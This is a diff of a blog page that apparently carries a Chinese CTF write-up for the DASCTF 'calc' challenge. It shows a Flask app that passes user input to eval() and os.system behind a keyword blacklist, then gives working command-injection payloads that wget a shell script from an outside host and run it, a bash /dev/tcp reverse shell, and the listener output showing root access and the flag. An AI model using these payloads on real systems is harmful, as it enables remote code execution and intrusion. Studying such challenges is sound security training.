@@ -458,19 +458,72 @@
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="DASCTF-calc"><a href="#DASCTF-calc" class="headerlink" title="[DASCTF]-calc"></a>[DASCTF]-calc</h1><p>打开来是个计算器，没猜错应该要RCE</p>
-<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br></pre></td></tr></table></figure></div>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><pre><code class="python">#coding=utf-8
+from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory
+import random
+from urllib import parse
+import os
+from werkzeug.utils import secure_filename
+import time
 
+app=Flask(__name__)
+
+def waf(s):
+    blacklist = [&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;]
+    flag = True
+    for no in blacklist:
+        if no.lower() in s.lower():
+            flag= False
+            print(no)
+            break
+    return flag
+    
+@app.route(&quot;/&quot;)
+def index():
+    &quot;欢迎来到SUctf2022&quot;
+    return render_template(&quot;index.html&quot;)
+
+@app.route(&quot;/calc&quot;,methods=[&#39;GET&#39;])
+def calc():
+    ip = request.remote_addr
+    num = request.values.get(&quot;num&quot;)
+    log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)
+    
+    if waf(num):
+        try:
+            data = eval(num)
+            os.system(log)
+        except:
+            pass
+        return str(data)
+    else:
+        return &quot;waf!!&quot;
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&#39;0.0.0.0&#39;,port=5000)  
+</code></pre>
 <p>过滤了一些命令常用的字符和函数，所以这里使用模板注入的机会不大，故专注于<code>os.system()</code>。另外，Linux命令常用的反引号没有被过滤，Python的注释符<code>#</code>也幸存了，由于<code>eval()</code>是执行一个Python的字符串表达式，为了不让它报错，需要用<code>#</code>把后面拼接的Linux命令注释掉。</p>
 <h2 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h2><p>由于过滤了很多字符，且命令并无回显，所以这里用<code>wget</code>下载反弹shell的<code>sh</code>文件，然后运行</p>
 <p>空格用%09绕过就好，也可以用<code>&gt;</code>等等，不多赘述</p>
 <p>上传一个这样的shell文件到一个网站上</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&#123;IP&#125;/&#123;PORT&#125; 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
-
+<pre><code class="shell">bash -i &gt;&amp; /dev/tcp/&#123;IP&#125;/&#123;PORT&#125; 0&gt;&amp;1
+</code></pre>
 <p>让目标机器保存在<code>/tmp</code>下，然后执行</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num=7*7%23`wget%09-P%09/tmp%09http://vveelin.com.cn:89/bsh.sh`</span><br><span class="line">num=7*7%23`sh%09/tmp/bsh.sh`</span><br></pre></td></tr></table></figure></div>
-
+<pre><code>num=7*7%23`wget%09-P%09/tmp%09http://vveelin.com.cn:89/bsh.sh`
+num=7*7%23`sh%09/tmp/bsh.sh`
+</code></pre>
 <p>攻击机监听对应端口，getshell</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@ecs-394098 ~]<span class="comment"># nc -lvnp 4444</span></span><br><span class="line">Ncat: Connection from 117.21.200.166.</span><br><span class="line">Ncat: Connection from 117.21.200.166:62378.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line"></span><br><span class="line">root@out:/<span class="comment"># cat Th1s_is__F1114g</span></span><br><span class="line"><span class="built_in">cat</span> Th1s_is__F1114g</span><br><span class="line">flag&#123;16c2218b-4113-411e-b64a-30dd12604d3c&#125;</span><br></pre></td></tr></table></figure></div>
+<pre><code class="bash">[root@ecs-394098 ~]# nc -lvnp 4444
+Ncat: Connection from 117.21.200.166.
+Ncat: Connection from 117.21.200.166:62378.
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@out:/# cat Th1s_is__F1114g
+cat Th1s_is__F1114g
+flag&#123;16c2218b-4113-411e-b64a-30dd12604d3c&#125;
+</code></pre>
+
         </div>
 
         
